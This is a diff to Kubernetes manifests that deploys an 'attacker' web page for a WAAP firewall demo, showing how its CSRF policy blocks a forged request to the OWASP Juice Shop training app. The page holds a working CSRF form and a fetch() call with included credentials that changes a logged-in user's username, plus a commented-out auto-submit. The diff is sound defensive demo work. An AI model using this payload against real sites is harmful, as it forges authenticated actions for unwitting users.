@@ -23,6 +23,14 @@ spec:
         cpu: 500m
     ports:
       - containerPort: 80
+    volumeMounts:
+      - mountPath: /usr/local/apache2/htdocs
+        name: webpage-volume
+  volumes:
+    - configMap:
+        defaultMode: 0775
+        name: index-page
+      name: webpage-volume
 ---
 apiVersion: v1
 kind: Service
@@ -36,3 +44,74 @@ spec:
     - protocol: TCP
       port: 9090
       targetPort: 80
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: index-page
+  namespace: attacker
+data:
+  index.html: |
+    <!DOCTYPE html>
+    <html>
+    <head><title>CSRF Attack</title></head>
+    
+    <body>
+    
+    <h2>Juiceshop Username Hacking Form</h2>
+    
+    This HTML page, loaded from the local file system, will send a request to the Juiceshop without an "Origin"
+    header (because it was not received from a website). The request attempts to change the "Username" in the
+    profile page to "hacked".
+    <p></p>
+    With CSRF enabled, that request will be blocked. Add this configuration in the Core WAAP CR:
+    <p></p>
+    
+    <pre>
+      crs:
+        mode: DISABLED
+      csrfPolicy:
+        enabled: true
+    </pre>
+    
+    Note that this example also disables Coraza (crs) for the sake of this simple demo, because otherwise this
+    attack would be prevented by the CRS filter as well.
+    
+    <p></p>
+    <hr>
+    <h3>Hacking Form</h3>
+    Submit form to hack "username" in Juiceshop
+    <form id="hackingform" 
+          action="https://juiceshop-via-waap-10-99-0-10.nip.io:8443/profile" 
+         method="POST">
+     Username:<input name="username" type="text" value="hacked" />
+     <input type="submit" value="Submit Request" />
+    </form>
+    <script type='text/javascript'>
+    
+    document.forms['hackingform'].addEventListener('submit', (event) => {
+        event.preventDefault();
+        // TODO do something here to show user that form is being submitted
+        fetch(event.target.action, {
+            method: 'POST',
+            credentials: 'include',
+            body: new URLSearchParams(new FormData(event.target)) // event.target is the form
+        }).then((response) => {
+            if (!response.ok) {
+              throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json(); // or response.text() or whatever the server sends
+        }).then((body) => {
+            // TODO handle body
+        }).catch((error) => {
+            // TODO handle error
+        });
+    });
+    </script>
+    
+    <!-- Uncomment lines below and remove "xxx" prefix to activate auto-submit on load 
+    <xxxscript>
+     document.getElementById("autosubmit").submit();
+    </xxxscript>
+    -->
+    </body></html>
